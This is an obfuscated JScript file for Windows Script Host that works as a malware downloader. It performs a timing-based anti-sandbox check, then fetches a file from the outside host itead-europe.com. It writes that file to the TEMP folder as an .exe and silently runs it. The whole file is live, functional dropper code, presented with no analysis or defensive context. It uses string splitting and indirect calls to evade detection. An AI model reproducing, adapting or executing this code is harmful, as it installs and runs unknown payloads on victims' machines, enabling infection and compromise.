var _ZW = false;
var _AF = "CreateObject";
var _D = function _B0() {return WScript[_AF]("WScript"+".Shell");}(), _W1 = 11;
var _EZ = "MSXML2.XMLHTTP";
var _XU = 2123213;
var _C = 0;
function _A(_M0){_D["Run"](_M0, _C, _C);};
function _IT(){return _EZ + "";};
function _OD(_QF, _AW0){_C = _C * 1; return _QF - _AW0;};
function _M(){return _AF;};
/*@cc_on
  @if (@_win32 || @_win64)
    _ZW = true;
  @end
@*/
if (_ZW)
{
var _W = "";
function _HC(){return 22;};
var _LU = 0; var _K = 0;
function _XA()
{
var _KP = new this["Date"]();
var _MG = _KP["getUTCMilliseconds"]();
WScript["Sleep"](_HC());
var _KP = new this["Date"]();
var _KR = _KP["getUTCMilliseconds"]();
WScript["Sleep"](_HC());
var _KP = new this["Date"]();
var _SS = _KP["getUTCMilliseconds"]();
var _LU = "_IE";
_LU = _OD(_KR, _MG);
var _K = "_BJ";
_K = _OD(_SS, _KR);
_W = "open";
return _OD(_LU, _K);
}
var _AW = false;
var _AC = false;
for (var _F = _C; _F < _HC() * 1; _F++){if (_XA() != _C){
_AW = true; 
_K = "31" + 11 * _LU + _K; 
_AC = true; 
break;
}}
function _G() {return ((_AW == true) && (_AW == _AC)) ? 1 : _C;};
if (_AW && _G() && _AC){
function _B() {return _D["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2wKaMMPZiGDGN.ex" + "e";};
 _NX = _IT();
 _QV = WScript[_AF](_NX);
 var _WM = 1;
 while (_WM){
try {
	if (_WM == 1)
	{
		_QV[_W]("GET", "http://itead-europe.com/k3ias", false);
		_QV["send"]();
		_KR0 = "Sleep";
	}
	WScript[_KR0](_HC() + 120); 
	if (_QV["readystate"] < 2 * 2) continue;
	_WM = _C;
	function _J(_CX) {var _RH = (1, 2, 3, 4, 5, _CX); return _RH;};
	_M1 = WScript[_M()]("ADODB.Stream");
	_NX = _M1;
	_NX[_W]();
	_NX["type"] = _J(1);
	_NX["write"](_QV["ResponseBody"]);
	_M1["position"] = _J(_C);
	_NX["Save" + "ToFile"](_B(), 2);
	_M1["cl"+"ose"]();
	_W0 = _B();
	_A(_W0);
} catch(_KP0){};
}
}
}

